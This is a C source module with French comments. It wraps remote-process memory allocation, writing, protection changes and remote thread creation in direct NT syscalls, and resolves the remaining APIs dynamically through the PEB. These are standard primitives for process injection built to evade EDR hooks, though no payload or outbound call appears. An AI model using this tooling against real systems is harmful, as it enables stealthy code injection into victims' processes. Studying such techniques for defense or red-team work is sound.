#include "utils/peb-lookup.h"
#include "utils/direct-syscalls.h"
#include "utils/memory.h"

#ifndef OBJ_INHERIT
#define OBJ_INHERIT 0x00000002L
#endif

/* ============================================================================
 * Manipulation de processus distants — direct syscalls NT
 *
 * Chaque wrapper traduit la signature Win32 classique vers l'interface NT,
 * construit les structures OBJECT_ATTRIBUTES / CLIENT_ID requises, puis
 * invoque le stub assembleur correspondant (direct-syscalls.asm).
 * ========================================================================= */

/**
 * @brief Ouvre un handle sur le processus cible via NtOpenProcess (direct syscall).
 *
 * Construit un CLIENT_ID à partir du PID et initialise OBJECT_ATTRIBUTES
 * avec l'option OBJ_INHERIT si bInheritHandle est vrai.
 */
HANDLE mem_open_process(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
    HANDLE           hProcess = NULL;
    CLIENT_ID        clientId;
    OBJECT_ATTRIBUTES objAttr;

    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
    clientId.UniqueThread  = NULL;

    InitializeObjectAttributes(&objAttr, NULL,
                               bInheritHandle ? OBJ_INHERIT : 0,
                               NULL, NULL);

    NTSTATUS status = dOpenProcess(&hProcess, dwDesiredAccess, &objAttr, &clientId);
    return (status >= 0) ? hProcess : NULL;
}

/**
 * @brief Alloue de la mémoire dans un processus distant via NtAllocateVirtualMemory
 *        (direct syscall).
 *
 * lpAddress est utilisé comme adresse de base souhaitée ; NULL laisse le noyau
 * choisir. La taille effective allouée peut être arrondie à la page supérieure.
 */
LPVOID mem_virtual_alloc_ex(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize,
                             DWORD flAllocationType, DWORD flProtect)
{
    PVOID  base = lpAddress;
    SIZE_T size = dwSize;

    NTSTATUS status = dAllocateVirtualMemory(hProcess, &base, 0, &size,
                                             flAllocationType, flProtect);
    return (status >= 0) ? base : NULL;
}

/**
 * @brief Écrit dans la mémoire d'un processus distant via NtWriteVirtualMemory
 *        (direct syscall).
 */
BOOL mem_write_process_memory(HANDLE hProcess, LPVOID lpBaseAddress,
                               LPCVOID lpBuffer, SIZE_T nSize,
                               SIZE_T *lpNumberOfBytesWritten)
{
    SIZE_T   written = 0;
    NTSTATUS status  = dWriteVirtualMemory(hProcess, lpBaseAddress,
                                           (PVOID)lpBuffer, nSize, &written);
    if (lpNumberOfBytesWritten)
        *lpNumberOfBytesWritten = written;
    return (status >= 0);
}

/**
 * @brief Lit la mémoire d'un processus distant via NtReadVirtualMemory (direct syscall).
 */
BOOL mem_read_process_memory(HANDLE hProcess, LPCVOID lpBaseAddress,
                              LPVOID lpBuffer, SIZE_T nSize,
                              SIZE_T *lpNumberOfBytesRead)
{
    SIZE_T   bytesRead = 0;
    NTSTATUS status    = dReadVirtualMemory(hProcess, (PVOID)lpBaseAddress,
                                            lpBuffer, nSize, &bytesRead);
    if (lpNumberOfBytesRead)
        *lpNumberOfBytesRead = bytesRead;
    return (status >= 0);
}

/**
 * @brief Modifie la protection d'une région mémoire distante via
 *        NtProtectVirtualMemory (direct syscall).
 *
 * Les paramètres BaseAddress et RegionSize sont passés par pointeur car le
 * noyau peut les ajuster aux limites de page.
 */
BOOL mem_virtual_protect_ex(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize,
                             DWORD flNewProtect, PDWORD lpflOldProtect)
{
    PVOID  base      = lpAddress;
    SIZE_T size      = dwSize;
    ULONG  oldProt   = 0;

    NTSTATUS status = dProtectVirtualMemory(hProcess, &base, &size,
                                            flNewProtect, &oldProt);
    if (lpflOldProtect)
        *lpflOldProtect = oldProt;
    return (status >= 0);
}

/**
 * @brief Crée un thread dans un processus distant via NtCreateThreadEx (direct syscall).
 *
 * lpThreadAttributes est ignoré : NtCreateThreadEx utilise OBJECT_ATTRIBUTES.
 * lpThreadId n'est pas rempli (NtCreateThreadEx ne le fournit pas directement).
 */
HANDLE mem_create_remote_thread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes,
                                 SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
                                 LPVOID lpParameter, DWORD dwCreationFlags,
                                 LPDWORD lpThreadId)
{
    HANDLE            hThread = NULL;
    OBJECT_ATTRIBUTES objAttr;

    (void)lpThreadAttributes; /* Remplacé par OBJECT_ATTRIBUTES vide */

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = dCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        &objAttr,
        hProcess,
        (PVOID)lpStartAddress,
        lpParameter,
        dwCreationFlags,
        0,       /* ZeroBits        */
        dwStackSize,
        0,       /* MaximumStackSize */
        NULL     /* AttributeList   */
    );

    if (lpThreadId)
        *lpThreadId = 0; /* Non disponible sans appel supplémentaire */

    return (status >= 0) ? hThread : NULL;
}

/* ============================================================================
 * Manipulation de processus distants — fallback g_Api
 *
 * Aucun direct syscall NT ne correspond directement à ces fonctions Win32 ;
 * on délègue à g_Api résolu dynamiquement via PEB au démarrage.
 * ========================================================================= */

BOOL mem_virtual_free_ex(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize,
                          DWORD dwFreeType)
{
    return g_Api.pVirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
}

BOOL mem_close_handle(HANDLE hObject)
{
    return g_Api.pCloseHandle(hObject);
}

/* ============================================================================
 * Énumération des processus — fallback g_Api
 * ========================================================================= */

HANDLE mem_create_snapshot(DWORD dwFlags, DWORD th32ProcessID)
{
    return g_Api.pCreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}

BOOL mem_process32_first(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
    return g_Api.pProcess32First(hSnapshot, lppe);
}

BOOL mem_process32_next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
    return g_Api.pProcess32Next(hSnapshot, lppe);
}

/* ============================================================================
 * Gestion des erreurs — fallback g_Api
 * ========================================================================= */

DWORD mem_get_last_error(void)
{
    return g_Api.pGetLastError();
}

DWORD mem_format_message(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId,
                          DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize,
                          va_list *Arguments)
{
    return g_Api.pFormatMessageA(dwFlags, lpSource, dwMessageId,
                                 dwLanguageId, lpBuffer, nSize, Arguments);
}
